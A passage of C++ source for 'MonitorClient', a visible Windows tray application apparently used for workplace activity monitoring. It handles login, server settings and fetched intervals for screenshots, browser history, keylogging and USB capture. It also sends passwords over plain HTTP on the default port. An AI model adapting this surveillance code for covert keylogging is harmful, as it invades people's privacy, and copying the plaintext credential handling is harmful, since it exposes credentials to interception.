static INT_PTR CALLBACK accountDialogProc(HWND dlg,UINT msg,WPARAM wp,LPARAM lp) {
    switch(msg){
    case WM_INITDIALOG:{
        SetWindowTextA(dlg,"MonitorClient v1.4 - Account");
        HWND tabs=addControl(dlg,WC_TABCONTROLA,"",WS_TABSTOP,12,9,425,34,AUTH_TABS);
        TCITEMA item={};item.mask=TCIF_TEXT;
        item.pszText=const_cast<char*>("Sign In");TabCtrl_InsertItem(tabs,0,&item);
        item.pszText=const_cast<char*>("Sign Up");TabCtrl_InsertItem(tabs,1,&item);
        addControl(dlg,"STATIC","Username/email",0,17,57,115,20,0);
        addControl(dlg,"EDIT","",WS_BORDER|WS_TABSTOP|ES_AUTOHSCROLL,130,54,290,26,AUTH_USER);
        addControl(dlg,"STATIC","Password",0,17,92,115,20,0);
        addControl(dlg,"EDIT","",WS_BORDER|WS_TABSTOP|ES_PASSWORD|ES_AUTOHSCROLL,130,89,290,26,AUTH_PASS);
        addControl(dlg,"STATIC","Confirm password",0,17,127,115,20,AUTH_CONFIRM_LABEL);
        addControl(dlg,"EDIT","",WS_BORDER|WS_TABSTOP|ES_PASSWORD|ES_AUTOHSCROLL,130,124,290,26,AUTH_CONFIRM);
        addControl(dlg,"BUTTON","Sign In",WS_TABSTOP|BS_DEFPUSHBUTTON,205,164,110,31,AUTH_SUBMIT);
        addControl(dlg,"BUTTON","Server...",WS_TABSTOP,20,164,92,31,AUTH_SERVER);
        addControl(dlg,"BUTTON","Cancel",WS_TABSTOP,324,164,96,31,IDCANCEL);
        addControl(dlg,"STATIC","Password must be at least 12 characters for Sign Up.",0,17,209,400,18,0);
        updateAuthTab(dlg);return TRUE;
    }
    case WM_NOTIFY:
        if(((NMHDR*)lp)->idFrom==AUTH_TABS && ((NMHDR*)lp)->code==TCN_SELCHANGE){
            updateAuthTab(dlg);return TRUE;
        }
        break;
    case WM_COMMAND:
        if(LOWORD(wp)==IDCANCEL){EndDialog(dlg,IDCANCEL);return TRUE;}
        if(LOWORD(wp)==AUTH_SERVER){showMonitorSettings();return TRUE;}
        if(LOWORD(wp)==AUTH_SUBMIT){
            const std::string name=editText(dlg,AUTH_USER),password=editText(dlg,AUTH_PASS);
            Json::Value request;request["username"]=name;request["password"]=password;
            if(currentSignupTab(dlg)){
                const std::string confirm=editText(dlg,AUTH_CONFIRM);
                if(password!=confirm){MessageBoxA(dlg,"Passwords do not match.","MonitorClient",MB_OK|MB_ICONWARNING);return TRUE;}
                request["action"]="signup";request["confirm_password"]=confirm;
                Json::Value answer=callClientAuth(request);
                if(answer.get("success",false).asBool()){
                    MessageBoxA(dlg,"Account created. Switch to Sign In.","MonitorClient",MB_OK|MB_ICONINFORMATION);
                    TabCtrl_SetCurSel(GetDlgItem(dlg,AUTH_TABS),0);updateAuthTab(dlg);
                    SetDlgItemTextA(dlg,AUTH_PASS,"");SetDlgItemTextA(dlg,AUTH_CONFIRM,"");
                }else{
                    const std::string msg=answer.get("code","").asString()=="username_exists"
                      ? "Username already exists. Please sign in instead."
                      : answer.get("error","Registration failed.").asString();
                    MessageBoxA(dlg,msg.c_str(),"MonitorClient",MB_OK|MB_ICONWARNING);
                    if(answer.get("code","").asString()=="username_exists"){
                        TabCtrl_SetCurSel(GetDlgItem(dlg,AUTH_TABS),0);updateAuthTab(dlg);
                    }
                }
                return TRUE;
            }
            request["action"]="login";request.removeMember("username");request["identifier"]=name;
            Json::Value answer=callClientAuth(request);
            SetDlgItemTextA(dlg,AUTH_PASS,"");
            if(!answer.get("success",false).asBool()){
                MessageBoxA(dlg,"Incorrect credentials. If your password is wrong, ask your administrator to reset it.",
                            "Sign-in failed",MB_ICONWARNING|MB_OK);
                return TRUE;
            }
            const std::string token=answer.get("token","").asString();
            if(token.size()!=64){MessageBoxA(dlg,"Invalid server response.","Sign-in failed",MB_ICONERROR);return TRUE;}
            {std::lock_guard<std::mutex> g(authMutex);clientToken=token;}
            signedInUsername=answer["user"].get("username","").asString();
            selectedMonitorId.store(0);
            rememberClientToken(token);
            EndDialog(dlg,IDOK);
            return TRUE;
        }
        break;
    }
    return FALSE;
}
static INT_PTR runDialog(DLGPROC proc) {
    struct BlankTemplate { DLGTEMPLATE dlg; WORD menu; WORD clazz; WORD title; };
    BlankTemplate t={};
    t.dlg.style=DS_MODALFRAME|WS_POPUP|WS_CAPTION|WS_SYSMENU;
    t.dlg.dwExtendedStyle=0;t.dlg.cdit=0;
    t.dlg.x=20;t.dlg.y=20;t.dlg.cx=285;t.dlg.cy=195;
    return DialogBoxIndirectParamA(GetModuleHandleA(NULL),&t.dlg,hMainWindow,proc,0);
}
bool showClientLogin() {
    if(keyboardHook)removeKeyboardHook();
    selectedMonitorId.store(0);
    {std::lock_guard<std::mutex> g(authMutex);clientToken.clear();}
    if(runDialog(accountDialogProc)!=IDOK){updateTrayIcon();return false;}
    updateTrayIcon();
    return showMonitorSettings();
}
static Json::Value settingsMonitors;
static void changeMonitorFields(HWND dlg) {
    int ix=(int)SendDlgItemMessageA(dlg,SETTINGS_MONITOR,CB_GETCURSEL,0,0);
    int id=ix>=0?(int)SendDlgItemMessageA(dlg,SETTINGS_MONITOR,CB_GETITEMDATA,ix,0):0;
    SetDlgItemTextA(dlg,SETTINGS_SAVE,id>0?"Save":"Add");
    SetDlgItemTextA(dlg,SETTINGS_LABEL,"");
    SetDlgItemTextA(dlg,SETTINGS_REMARK,"");
    SendDlgItemMessageA(dlg,SETTINGS_OS,CB_SETCURSEL,0,0);
    SendDlgItemMessageA(dlg,SETTINGS_MACHINE,CB_SETCURSEL,0,0);
    if(!id)return;
    for(const auto &monitor:settingsMonitors){
        if(monitor.get("id",0).asInt()!=id)continue;
        SetDlgItemTextA(dlg,SETTINGS_LABEL,monitor.get("name","").asString().c_str());
        SetDlgItemTextA(dlg,SETTINGS_REMARK,monitor.get("remark","").asString().c_str());
        const std::string platform=monitor.get("platform","Windows").asString();
        SendDlgItemMessageA(dlg,SETTINGS_OS,CB_SETCURSEL,
            platform=="Mac"?1:platform=="Ubuntu"?2:0,0);
        SendDlgItemMessageA(dlg,SETTINGS_MACHINE,CB_SETCURSEL,
            monitor.get("type","").asString()=="desktop"?1:0,0);
        break;
    }
}
static INT_PTR CALLBACK settingsDialogProc(HWND dlg,UINT msg,WPARAM wp,LPARAM lp) {
    switch(msg) {
    case WM_INITDIALOG: {
        SetWindowTextA(dlg,"MonitorClient v1.4 - Settings");
        addControl(dlg,"STATIC","Username",0,13,9,95,20,0);
        HWND user=addControl(dlg,"EDIT",signedInUsername.c_str(),
            WS_BORDER|ES_AUTOHSCROLL,108,7,310,25,SETTINGS_USER);
        addControl(dlg,"STATIC","Server IP",0,13,40,95,20,0);
        addControl(dlg,"EDIT",serverIP.c_str(),WS_BORDER|ES_AUTOHSCROLL,
            108,38,310,25,SETTINGS_IP);
        addControl(dlg,"STATIC","Port",0,13,71,95,20,0);
        addControl(dlg,"EDIT",serverPort.c_str(),WS_BORDER|ES_AUTOHSCROLL,
            108,69,310,25,SETTINGS_PORT);
        addControl(dlg,"STATIC","Monitor",0,13,105,95,20,0);
        HWND selector=addControl(dlg,"COMBOBOX","",CBS_DROPDOWNLIST|WS_VSCROLL|WS_TABSTOP,
            108,102,310,170,SETTINGS_MONITOR);
        addControl(dlg,"STATIC","Label (optional)",0,13,136,95,20,0);
        addControl(dlg,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,
            108,133,310,25,SETTINGS_LABEL);
        addControl(dlg,"STATIC","OS",0,13,166,95,20,0);
        HWND os=addControl(dlg,"COMBOBOX","",CBS_DROPDOWNLIST|WS_VSCROLL,
            108,163,310,120,SETTINGS_OS);
        for(const char *name:{"Windows","Mac","Ubuntu"})SendMessageA(os,CB_ADDSTRING,0,(LPARAM)name);
        addControl(dlg,"STATIC","Machine",0,13,197,95,20,0);
        HWND machine=addControl(dlg,"COMBOBOX","",CBS_DROPDOWNLIST|WS_VSCROLL,
            108,194,310,120,SETTINGS_MACHINE);
        for(const char *name:{"Laptop","Desktop"})SendMessageA(machine,CB_ADDSTRING,0,(LPARAM)name);
        addControl(dlg,"STATIC","Remark",0,13,228,95,20,0);
        addControl(dlg,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,
            108,225,310,25,SETTINGS_REMARK);
        addControl(dlg,"BUTTON","Show status notifications",BS_AUTOCHECKBOX|WS_TABSTOP,
            108,259,250,24,SETTINGS_NOTIFY);
        CheckDlgButton(dlg,SETTINGS_NOTIFY,notificationsEnabled?BST_CHECKED:BST_UNCHECKED);
        addControl(dlg,"STATIC",
            connectionStatus.serverConnected && selectedMonitorId.load()>0 && !getClientToken().empty()
              ? "Status: Connected" : "Status: Offline / Sign in required",
            0,108,294,310,20,0);
        HWND logout=addControl(dlg,"BUTTON","Log Out",WS_TABSTOP,108,332,96,30,SETTINGS_LOGOUT);
        EnableWindow(logout,!getClientToken().empty());
        addControl(dlg,"BUTTON","Save",BS_DEFPUSHBUTTON|WS_TABSTOP,
            214,332,104,30,SETTINGS_SAVE);
        addControl(dlg,"BUTTON","Cancel",WS_TABSTOP,330,332,88,30,IDCANCEL);
        if(!getClientToken().empty()) {
            Json::Value req;req["action"]="monitors";
            Json::Value answer=callClientAuth(req);
            settingsMonitors=answer.get("monitors",Json::arrayValue);
        }else settingsMonitors=Json::arrayValue;
        int sel=-1,count=0;
        for(const auto &device:settingsMonitors) {
            int id=device.get("id",0).asInt();
            std::string label=device.get("name","Monitor").asString()
                +" | "+device.get("platform","-").asString()
                +" | "+device.get("type","desktop").asString()
                +" | "+device.get("ip_address","-").asString();
            int pos=(int)SendMessageA(selector,CB_ADDSTRING,0,(LPARAM)label.c_str());
            SendMessageA(selector,CB_SETITEMDATA,pos,id);
            if(id==selectedMonitorId.load())sel=pos;
            count++;
        }
        int add=(int)SendMessageA(selector,CB_ADDSTRING,0,(LPARAM)"Add New...");
        SendMessageA(selector,CB_SETITEMDATA,add,0);
        SendMessageA(selector,CB_SETCURSEL,sel>=0?sel:add,0);
        changeMonitorFields(dlg);
        return TRUE;
    }
    case WM_COMMAND:
        if(LOWORD(wp)==IDCANCEL){EndDialog(dlg,IDCANCEL);return TRUE;}
        if(LOWORD(wp)==SETTINGS_MONITOR && HIWORD(wp)==CBN_SELCHANGE){
            changeMonitorFields(dlg);return TRUE;
        }
        if(LOWORD(wp)==SETTINGS_LOGOUT){
            Json::Value logout;logout["action"]="logout";
            if(!getClientToken().empty())callClientAuth(logout);
            const std::string target=credentialTarget();
            CredDeleteA(target.c_str(),CRED_TYPE_GENERIC,0);
            {std::lock_guard<std::mutex> lock(authMutex);clientToken.clear();}
            selectedMonitorId.store(0);
            signedInUsername.clear();
            if(keyboardHook)removeKeyboardHook();
            updateTrayIcon();
            EndDialog(dlg,IDCANCEL);
            PostMessageA(hMainWindow,WM_COMMAND,MAKEWPARAM(ID_TRAY_SIGN_IN,0),0);
            return TRUE;
        }
        if(LOWORD(wp)==SETTINGS_SAVE){
            std::string name=editText(dlg,SETTINGS_USER);
            std::string ip=editText(dlg,SETTINGS_IP);
            std::string port=editText(dlg,SETTINGS_PORT);
            if(ip.empty()||port.empty()||port.find_first_not_of("0123456789")!=std::string::npos){
                MessageBoxA(dlg,"Enter a valid server IP and numeric port.","MonitorClient",MB_ICONWARNING);
                return TRUE;
            }
            int nport=std::atoi(port.c_str());
            if(nport<1||nport>65535){MessageBoxA(dlg,"Invalid port.","MonitorClient",MB_ICONWARNING);return TRUE;}
            notificationsEnabled=IsDlgButtonChecked(dlg,SETTINGS_NOTIFY)==BST_CHECKED;
            saveClientSetting("Client","notifications",notificationsEnabled?"1":"0");
            saveClientSetting("Server","username",name);
            saveClientSetting("Server","ip",ip);
            saveClientSetting("Server","port",port);
            const bool serverChanged=ip!=serverIP || port!=serverPort;
            if(serverChanged){
                const std::string oldTarget=credentialTarget();
                CredDeleteA(oldTarget.c_str(),CRED_TYPE_GENERIC,0);
                serverIP=ip;serverPort=port;
                API_BASE_URL=(port=="8924"?"http://":"https://")+ip+":"+port;
                selectedMonitorId.store(0);
                {std::lock_guard<std::mutex> guard(authMutex);clientToken.clear();}
                if(keyboardHook)removeKeyboardHook();
                EndDialog(dlg,IDOK);
                MessageBoxA(hMainWindow,"Server connection changed. Sign in to the new server.","MonitorClient",MB_OK|MB_ICONINFORMATION);
                PostMessageA(hMainWindow,WM_COMMAND,MAKEWPARAM(ID_TRAY_SIGN_IN,0),0);
                return TRUE;
            }
            if(getClientToken().empty()){
                EndDialog(dlg,IDOK);return TRUE;
            }
            int index=(int)SendDlgItemMessageA(dlg,SETTINGS_MONITOR,CB_GETCURSEL,0,0);
            int id=index>=0?(int)SendDlgItemMessageA(dlg,SETTINGS_MONITOR,CB_GETITEMDATA,index,0):0;
            Json::Value data;
            data["action"]=id>0?"save_monitor":"request_monitor";
            data["monitor_id"]=id;
            data["label"]=editText(dlg,SETTINGS_LABEL);
            int osi=(int)SendDlgItemMessageA(dlg,SETTINGS_OS,CB_GETCURSEL,0,0);
            data["os"]=osi==1?"Mac":osi==2?"Ubuntu":"Windows";
            int machine=(int)SendDlgItemMessageA(dlg,SETTINGS_MACHINE,CB_GETCURSEL,0,0);
            data["machine"]=machine==1?"desktop":"laptop";
            data["remark"]=editText(dlg,SETTINGS_REMARK);
            Json::Value saved=callClientAuth(data);
            if(!saved.get("success",false).asBool()){
                const std::string msg=saved.get("error","Unable to save monitor settings.").asString();
                MessageBoxA(dlg,msg.c_str(),"MonitorClient",MB_ICONERROR|MB_OK);
                return TRUE;
            }
            const int selectedId=id>0?id:saved.get("monitor_id",0).asInt();
            if(selectedId<1){
                MessageBoxA(dlg,"No monitor ID returned.","MonitorClient",MB_ICONERROR);
                return TRUE;
            }
            Json::Value req;req["action"]="select";req["monitor_id"]=selectedId;
            Json::Value result=callClientAuth(req);
            if(!result.get("success",false).asBool()){
                MessageBoxA(dlg,"Monitor not assigned to your account.","MonitorClient",MB_ICONERROR);
                return TRUE;
            }
            selectedMonitorId.store(selectedId);
            signedInUsername=name;
            if(!keyboardHook)setupKeyboardHook();
            if(!usbMonitoringActive)setupUSBMONITORING();
            EndDialog(dlg,IDOK);
            return TRUE;
        }
        break;
    }
    return FALSE;
}
bool showMonitorSettings() {
    // A signed-out user can also configure the server address before login.
    // Resize the same blank dialog template with room for monitor fields.
    struct BlankTemplate { DLGTEMPLATE dlg; WORD menu; WORD clazz; WORD title; };
    BlankTemplate t={};
    t.dlg.style=DS_MODALFRAME|WS_POPUP|WS_CAPTION|WS_SYSMENU;
    t.dlg.dwExtendedStyle=0;t.dlg.cdit=0;
    t.dlg.x=20;t.dlg.y=20;t.dlg.cx=285;t.dlg.cy=295;
    bool success=DialogBoxIndirectParamA(GetModuleHandleA(NULL),&t.dlg,
        hMainWindow,settingsDialogProc,0)==IDOK;
    updateTrayIcon();
    updateTrayMenu();
    return success;
}

// Main function
int main() {
    // Set DPI awareness to handle scaling properly (MinGW compatible)
    SetProcessDPIAware();
    INITCOMMONCONTROLSEX common={sizeof(INITCOMMONCONTROLSEX),ICC_TAB_CLASSES};
    InitCommonControlsEx(&common);
    
    // Initialize COM for GDI+
    CoInitialize(NULL);
    
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Warning: Could not initialize Winsock" << std::endl;
    }
    
    // Get MAC address
    macAddress = getMacAddress();
    if (macAddress.empty()) {
        std::cerr << "Warning: Could not get MAC address" << std::endl;
    }
    
    // Load settings from settings.ini
    if (!loadSettings()) {
        std::cerr << "Error: Could not load settings.ini" << std::endl;
        return 1;
    }
    
    // Fetch configuration from API
    fetchConfigurationFromAPI();
    
    // Do not activate activity capture before an explicit sign-in.
    setupSystemTray();
    if (!restoreClientSession()) showClientLogin();
    else if(selectedMonitorId.load()<1) showMonitorSettings();
    
    // Start monitoring thread
    std::thread monitorThread(monitorTask);
    // Monitoring thread started
    
    // Message loop for system tray
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        
        // Check if we should exit
        if (msg.message == WM_QUIT) {
            break;
        }
    }
    
    // Cleanup
    activeRunning = false;
    monitorThread.join();
    removeKeyboardHook();
    cleanupUSBMONITORING();
    cleanupSystemTray();

    CoUninitialize();
    WSACleanup();
    
    return 0;
}

// Write debug log to file
void writeDebugLog(const std::string& message) {
    std::ofstream logFile("monitor_debug.log", std::ios::app);
    if (logFile.is_open()) {
        std::string timestamp = getCurrentDateTimeString();
        logFile << "[" << timestamp << "] " << message << std::endl;
        logFile.close();
    }
} 

// Load settings from settings.ini
bool loadSettings() {
    std::ifstream settingsFile("settings.ini");
    if (!settingsFile.is_open()) {
        notificationsEnabled = true;
        // settings.ini not found, using defaults
        serverIP = "192.168.1.45";
        serverPort = "8924";
        username = "default_user";
        API_BASE_URL = (serverPort == "8924" ? "http://" : "https://") + serverIP + ":" + serverPort;
        return true;
    }

    std::string line;
    std::string currentSection = "";
    
    while (std::getline(settingsFile, line)) {
        // Remove leading/trailing whitespace
        line.erase(0, line.find_first_not_of(" \t"));
        line.erase(line.find_last_not_of(" \t") + 1);
        
        // Skip empty lines and comments
        if (line.empty() || line[0] == ';' || line[0] == '#') {
            continue;
        }
        
        // Check for section headers
        if (line[0] == '[' && line[line.length()-1] == ']') {
            currentSection = line.substr(1, line.length()-2);
            continue;
        }
        
        // Parse key-value pairs
        size_t equalPos = line.find('=');
        if (equalPos != std::string::npos) {
            std::string key = line.substr(0, equalPos);
            std::string value = line.substr(equalPos + 1);
            
            // Remove leading/trailing whitespace from key and value
            key.erase(0, key.find_first_not_of(" \t"));
            key.erase(key.find_last_not_of(" \t") + 1);
            value.erase(0, value.find_first_not_of(" \t"));
            value.erase(value.find_last_not_of(" \t") + 1);
            
            if (currentSection == "Server") {
                if (key == "ip") {
                    serverIP = value;
                } else if (key == "port") {
                    serverPort = value;
                } else if (key == "username") {
                    username = value;
                }
            }
        }
    }
    settingsFile.close();

    API_BASE_URL = (serverPort == "8924" ? "http://" : "https://") + serverIP + ":" + serverPort;
    notificationsEnabled = GetPrivateProfileIntA("Client","notifications",1,"settings.ini") != 0;
    // Settings loaded
    return true;
}

// Configuration Management Functions
bool fetchConfigurationFromAPI() {
    if (isConfigUpdating) {
        writeDebugLog("Configuration update already in progress, skipping");
        return false;
    }
    
    isConfigUpdating = true;
    writeDebugLog("Fetching configuration from API");
    
    std::string configURL = API_BASE_URL + "/webapi_config.php?platform=windows";
    
    HINTERNET hInternet = InternetOpenA("MonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        writeDebugLog("Failed to initialize internet connection");
        isConfigUpdating = false;
        return false;
    }
    
    HINTERNET hConnect = InternetOpenUrlA(hInternet, configURL.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        writeDebugLog("Failed to open configuration URL: " + configURL);
        InternetCloseHandle(hInternet);
        isConfigUpdating = false;
        return false;
    }
    
    std::string response;
    char buffer[4096];
    DWORD bytesRead;
    
    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response += buffer;
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    if (response.empty()) {
        writeDebugLog("No configuration data received");
        isConfigUpdating = false;
        return false;
    }
    
    // Parse JSON response
    Json::Value root;
    Json::Reader reader;
    
    if (!reader.parse(response, root)) {
        writeDebugLog("Failed to parse configuration JSON: " + reader.getFormattedErrorMessages());
        isConfigUpdating = false;
        return false;
    }
    
    if (!root["success"].asBool()) {
        writeDebugLog("Configuration fetch failed: " + root["error"].asString());
        isConfigUpdating = false;
        return false;
    }
    
    // Update configuration
    Json::Value data = root["data"];
    if (data.isObject()) {
        updateConfiguration(data);
        writeDebugLog("Configuration updated successfully");
        isConfigUpdating = false;
        return true;
    }
    
    writeDebugLog("Invalid configuration data format");
    isConfigUpdating = false;
    return false;
}

void updateConfiguration(const Json::Value& config) {
    // Update intervals
    if (config["intervals"].isObject()) {
        Json::Value intervals = config["intervals"];
        
        if (intervals["screenshot"].isInt()) {
            screenInterval = intervals["screenshot"].asInt();
        }
        if (intervals["tic"].isInt()) {
            ticInterval = intervals["tic"].asInt();
        }
        if (intervals["history"].isInt()) {
            historyInterval = intervals["history"].asInt();
        }
        if (intervals["keylog"].isInt()) {
            keyInterval = intervals["keylog"].asInt();
        }
        if (intervals["usb"].isInt()) {
            usbInterval = intervals["usb"].asInt();
        }
        if (intervals["config_refresh"].isInt()) {
            configRefreshInterval = intervals["config_refresh"].asInt();
        }
    }
    
    // Store current configuration
    currentConfig.intervals.screenshot = screenInterval;
    currentConfig.intervals.tic = ticInterval;
    currentConfig.intervals.history = historyInterval;
    currentConfig.intervals.keylog = keyInterval;
    currentConfig.intervals.usb = usbInterval;
    currentConfig.intervals.config_refresh = configRefreshInterval;
    
    if (config["platform"].isString()) {
        currentConfig.platform = config["platform"].asString();
    }
    if (config["version"].isString()) {
        currentConfig.version = config["version"].asString();
    }
    if (config["last_updated"].isString()) {
        currentConfig.last_updated = config["last_updated"].asString();
    }
    
    lastConfigUpdate = std::chrono::system_clock::now();
    
    // Log configuration update
    writeDebugLog("Configuration updated:");
    writeDebugLog("  Screenshot: " + std::to_string(screenInterval) + "s");
    writeDebugLog("  Tic: " + std::to_string(ticInterval) + "s");
    writeDebugLog("  History: " + std::to_string(historyInterval) + "s");
    writeDebugLog("  Keylog: " + std::to_string(keyInterval) + "s");
    writeDebugLog("  USB: " + std::to_string(usbInterval) + "s");
    writeDebugLog("  Config Refresh: " + std::to_string(configRefreshInterval) + "s");
}

void manualConfigRefresh() {
    writeDebugLog("Manual configuration refresh requested");
    fetchConfigurationFromAPI();
}

static HICON greenTrayIcon=nullptr;
static HICON redTrayIcon=nullptr;
// Setup system tray
void setupSystemTray() {
    // Register window class for the tray icon
    WNDCLASSEXA wcex;
    ZeroMemory(&wcex, sizeof(WNDCLASSEXA));
    wcex.cbSize = sizeof(WNDCLASSEXA);
    wcex.lpfnWndProc = WindowProc;
    wcex.hInstance = GetModuleHandleA(NULL);
    wcex.hIcon = LoadIconA(NULL, (LPCSTR)IDI_APPLICATION);
    wcex.hCursor = LoadCursorA(NULL, (LPCSTR)IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszClassName = "MonitorTrayIcon";
    
    if (!RegisterClassExA(&wcex)) {
        // Failed to register window class
        return;
    }

    // Create the main window (hidden)
    hMainWindow = CreateWindowExA(
        0, 
        "MonitorTrayIcon", 
        "Monitor Client", 
        WS_OVERLAPPED, 
        0, 0, 0, 0, 
        NULL, NULL, 
        GetModuleHandleA(NULL), 
        NULL
    );
    
    if (!hMainWindow) {
        // Failed to create main window
        return;
    }
    
    ShowWindow(hMainWindow, SW_HIDE); // Hide the main window

    // Create the tray icon
    ZeroMemory(&nid, sizeof(NOTIFYICONDATAA));
    nid.cbSize = sizeof(NOTIFYICONDATAA);
    nid.hWnd = hMainWindow;
    nid.uID = 1; // Unique ID for this icon
    nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    nid.uCallbackMessage = WM_TRAYICON;
    nid.hIcon = LoadIconA(NULL, (LPCSTR)IDI_APPLICATION);
    strcpy_s(nid.szTip, "Monitor Client");

    if (!Shell_NotifyIconA(NIM_ADD, &nid)) {
        // Failed to add tray icon
        return;
    }

    // Create context menu (will be updated dynamically)
    hTrayMenu = CreatePopupMenu();

    // Set the tray icon and menu
    updateTrayIcon();
    updateTrayMenu();
    
    // System tray setup completed
}

// Cleanup system tray
void cleanupSystemTray() {
    Shell_NotifyIconA(NIM_DELETE, &nid);
    if(greenTrayIcon && greenTrayIcon!=LoadIconA(nullptr,(LPCSTR)IDI_APPLICATION))DestroyIcon(greenTrayIcon);
    if(redTrayIcon && redTrayIcon!=LoadIconA(nullptr,(LPCSTR)IDI_APPLICATION))DestroyIcon(redTrayIcon);
    greenTrayIcon=redTrayIcon=nullptr;
    if (hTrayMenu) {
        DestroyMenu(hTrayMenu);
        hTrayMenu = NULL;
    }
    if (hMainWindow) {
        DestroyWindow(hMainWindow);
        hMainWindow = NULL;
    }
}

// Window procedure for the main window
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_TRAYICON:
            if (lParam == WM_RBUTTONUP) {
                POINT pt;
                GetCursorPos(&pt);
                SetForegroundWindow(hwnd); // Bring window to foreground
                updateTrayMenu(); // Update menu with current status
                TrackPopupMenu(hTrayMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, NULL);
            }
            return 0;
        case WM_COMMAND:
            switch (LOWORD(wParam)) {
                case ID_TRAY_EXIT:
                    PostQuitMessage(0);
                    break;
                case ID_TRAY_STATUS:
                case ID_TRAY_CLIENT_INFO:
                case ID_TRAY_SERVER_INFO:
                case ID_TRAY_SCREENSHOT_STATUS:
                case ID_TRAY_TIC_STATUS:
                case ID_TRAY_BROWSER_STATUS:
                case ID_TRAY_KEYLOG_STATUS:
                case ID_TRAY_USB_STATUS:
                    // No action (status items are disabled)
                    break;
                case ID_TRAY_SEND_ALL:
                    std::thread([](){
                        sendInitialDataRequests();
                    }).detach();
                    break;
                case ID_TRAY_SIGN_IN:
                    showClientLogin();
                    break;
                case ID_TRAY_SETTINGS:
                    showMonitorSettings();
                    break;
                case ID_TRAY_NOTIFICATIONS:
                    notificationsEnabled = !notificationsEnabled;
                    WritePrivateProfileStringA("Client","notifications",notificationsEnabled ? "1":"0","settings.ini");
                    updateTrayMenu();
                    break;
                case ID_TRAY_CONFIG_REFRESH:
                    std::thread([](){
                        manualConfigRefresh();
                    }).detach();
                    break;
            }
            break;
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProcA(hwnd, uMsg, wParam, lParam);
}



// Build a colored status dot over the system tray icon.
static HICON buildStatusIcon(COLORREF dot) {
    HICON base=LoadIconA(nullptr,(LPCSTR)IDI_APPLICATION);
    ICONINFO info={};
    if(!GetIconInfo(base,&info))return base;
    HBITMAP color=(HBITMAP)CopyImage(info.hbmColor,IMAGE_BITMAP,32,32,LR_CREATEDIBSECTION);
    if(!color){
        DeleteObject(info.hbmColor);DeleteObject(info.hbmMask);
        return base;
    }
    HDC screen=GetDC(nullptr),dc=CreateCompatibleDC(screen),mask=CreateCompatibleDC(screen);
    HBITMAP old=(HBITMAP)SelectObject(dc,color);
    HBITMAP oldMask=(HBITMAP)SelectObject(mask,info.hbmMask);
    PatBlt(mask,19,19,13,13,BLACKNESS);
    HBRUSH brush=CreateSolidBrush(dot);
    HPEN pen=CreatePen(PS_SOLID,2,RGB(255,255,255));
    HGDIOBJ oldBrush=SelectObject(dc,brush),oldPen=SelectObject(dc,pen);
    Ellipse(dc,19,19,32,32);
    SelectObject(dc,oldBrush);SelectObject(dc,oldPen);
    SelectObject(dc,old);SelectObject(mask,oldMask);
    DeleteObject(brush);DeleteObject(pen);
    DeleteDC(dc);DeleteDC(mask);ReleaseDC(nullptr,screen);
    ICONINFO result=info;result.hbmColor=color;
    HICON icon=CreateIconIndirect(&result);
    DeleteObject(color);DeleteObject(info.hbmColor);DeleteObject(info.hbmMask);
    return icon?icon:base;
}
void updateTrayIcon() {
    const bool active=connectionStatus.serverConnected && selectedMonitorId.load()>0
                      && !getClientToken().empty();
    if(!greenTrayIcon)greenTrayIcon=buildStatusIcon(RGB(22,185,80));
    if(!redTrayIcon)redTrayIcon=buildStatusIcon(RGB(227,45,45));
    nid.uFlags=NIF_ICON|NIF_MESSAGE|NIF_TIP;
    nid.hIcon=active?greenTrayIcon:redTrayIcon;
    strcpy_s(nid.szTip,active?"MonitorClient v1.4 - Active":
         "MonitorClient v1.4 - Offline / Sign in or configure monitor");
    Shell_NotifyIconA(NIM_MODIFY,&nid);
}

// Show connection error notification
void showConnectionError(const std::string& error) {
    showToastNotification("Connection Error", error, "error");
    connectionStatus.lastError = error;
    connectionStatus.lastSuccess = std::chrono::steady_clock::now();
    updateTrayIcon();
}

// Test server connection
bool testServerConnection() {
    std::string url = API_BASE_URL + TIC_ROUTE;
    writeDebugLog("Testing connection to: " + url);
    
    std::string response = httpPost(url, "{\"Event\":\"Tic\",\"Version\":\"1.0\",\"MacAddress\":\"" + macAddress + "\"}");
    
    // Check if we got any response at all
    if (response.empty()) {
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "No response from server (server may be down or unreachable)";
        writeDebugLog("Connection test failed: No response from server");
        updateTrayIcon();
        checkConnectionStatusChange();
        return false;
    }
    
    writeDebugLog("Server response: " + response);
    
    // Parse response
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("status") && root["status"].asString() == "success") {
            connectionStatus.serverConnected = true;
            connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            connectionStatus.lastError = "";
            writeDebugLog("Connection test successful");
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        } else {
            connectionStatus.serverConnected = false;
            connectionStatus.lastError = "Server responded with error: " + response;
            writeDebugLog("Connection test failed: Server error response");
            updateTrayIcon();
            checkConnectionStatusChange();
            return false;
        }
    } else {
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "Server returned invalid JSON: " + response;
        writeDebugLog("Connection test failed: Invalid JSON response");
        updateTrayIcon();
        checkConnectionStatusChange();
        return false;
    }
} 

// Helper function to get the local network IPv4 address - improved version
std::string getLocalIPAddress() {
    std::string foundIP = "Unknown";
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
